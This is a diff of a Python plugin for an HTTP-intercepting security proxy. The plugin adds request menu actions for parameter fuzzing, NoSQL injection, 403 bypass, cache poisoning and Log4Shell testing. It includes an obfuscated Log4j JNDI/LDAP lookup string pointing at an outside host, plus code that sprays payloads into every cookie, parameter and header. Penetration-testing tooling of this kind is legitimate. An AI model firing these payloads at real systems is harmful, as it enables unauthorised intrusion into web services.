@@ -1,6 +1,7 @@
 import json, copy
 import urllib2, ssl
 
+
 pool = RequestPool(10)
 
 
@@ -8,8 +9,27 @@ def base64Encode(selectedText):
     return base64encode(selectedText)
 
 
-def insertAtCursor():
-    return "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//3s5npu.example.com:/a}"
+def unicodeEscape(selectedText):
+    return selectedText.encode('utf-8').decode('unicode_escape')
+
+
+def jsonUnicodeEscape(selectedText):
+    json_object = json.loads(selectedText)
+    return json.dumps(json_object, ensure_ascii=False, indent=2)
+
+
+# When performing network I/O or other time-consuming operations, the main thread's user interface (UI) gets blocked
+# until these operations are completed. By delegating time-consuming network I/O operations to threads(@run_in_thread),
+# the main thread can continue executing other tasks without being blocked.
+@run_in_thread
+def log4shell(request):
+    payload = "log4shell payload"
+    sendRequest(modifyAllParamsValue(request, payload, [HttpParameterType.COOKIE]))
+    sendRequest(modifyAllParamsValue(request, payload))
+    for header in request.headers():
+        if header.name().lower() not in ["cookie", "host"]:
+            request = request.withHeader(header.name(), payload)
+    sendRequest(request)
 
 
 def fuzzParamPerRequest(request):
@@ -26,16 +46,7 @@ def fuzzParamPerRequest(request):
 @run_in_thread
 def fuzzParamsOneRequest(request):
     payload = "'\">"
-    if request.contentType() == ContentType.JSON:
-        json_body = json.loads(request.bodyToString().encode())
-        traverse_and_modify_all(json_body, payload)
-        request = request.withBody(json.dumps(json_body))
-    for param in request.parameters():
-        if param.type() == HttpParameterType.JSON:
-            continue
-        request = request.withParameter(parameter(param.name(), param.value() + payload, param.type()))
-    resp = sendRequest(request).response()
-#    print(resp.statusCode())
+    sendRequest(modifyAllParamsValue(request, payload, [HttpParameterType.COOKIE]))
 
 
 def bypass403(editor, request):
@@ -68,13 +79,8 @@ def noSqliScanCallBack(requestResponse):
             break
 
 
-def unicodeEscape(selectedText):
-    return selectedText.encode('utf-8').decode('unicode_escape')
-
-
-def jsonUnicodeEscape(selectedText):
-    json_object = json.loads(selectedText)
-    return json.dumps(json_object, ensure_ascii=False, indent=2)
+def insertAtCursor():
+    return "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//3s5npu.example.com:/a}"
 
 
 def registerContextMenu(menus):
@@ -84,15 +90,19 @@ def registerContextMenu(menus):
     The menu types include CARET, SELECTED_TEXT, REQUEST, and EDIT_REQUEST.
     """
     menus.register("Base64 Encode", base64Encode, MenuType.SELECTED_TEXT)
-    menus.register("Insert Log4j", insertAtCursor, MenuType.CARET)
+    menus.register("Unicode Escape", unicodeEscape, MenuType.SELECTED_TEXT)
+    menus.register("JSON Unicode Escape", jsonUnicodeEscape, MenuType.SELECTED_TEXT)
+
+    menus.register("Log4shell", log4shell, MenuType.REQUEST)
     menus.register("FUZZ Param perReq", fuzzParamPerRequest, MenuType.REQUEST)
     menus.register("FUZZ Param oneReq", fuzzParamsOneRequest, MenuType.REQUEST)
-    menus.register("Bypass 403", bypass403, MenuType.EDIT_REQUEST)
     menus.register("NoSQL Injection", noSqliScan, MenuType.REQUEST)
     menus.register("Send to Xray", sendRequestWithProxy, MenuType.REQUEST)
     menus.register("File Extension Cache Poison", cachePoison, MenuType.REQUEST)
-    menus.register("Unicode Escape", unicodeEscape, MenuType.SELECTED_TEXT)
-    menus.register("JSON Unicode Escape", jsonUnicodeEscape, MenuType.SELECTED_TEXT)
+
+    menus.register("Bypass 403", bypass403, MenuType.EDIT_REQUEST)
+
+    menus.register("Insert Log4j", insertAtCursor, MenuType.CARET)
 
 
 def finish():
@@ -152,9 +162,6 @@ def sendRequestWithProxy(request):
     url = request.url().encode()
     headers = {}
     for header in request.headers():
-        if 'Accept-Encoding'.lower() == header.name().lower():
-            headers.update({"Accept-Encoding": "deflate"})
-            continue
         h = {header.name().encode(): header.value().encode()}
         headers.update(h)
     body = request.bodyToString().encode()
@@ -172,4 +179,17 @@ def send_request_with_proxy(url, method, headers, body, proxy):
     request = urllib2.Request(url, data=body, headers=headers)
     request.get_method = lambda: method
     response = urllib2.urlopen(request, timeout=8)
-#    print(response.read())
+    print(url, response.getcode())
+
+
+def modifyAllParamsValue(request, value, excluded=[]):
+    if request.contentType() == ContentType.JSON:
+        json_body = json.loads(request.bodyToString().encode())
+        traverse_and_modify_all(json_body, value)
+        request = request.withBody(json.dumps(json_body))
+    for param in request.parameters():
+        excluded.append(HttpParameterType.JSON)
+        if param.type() in excluded:
+            continue
+        request = request.withParameter(parameter(param.name(), value, param.type()))
+    return request
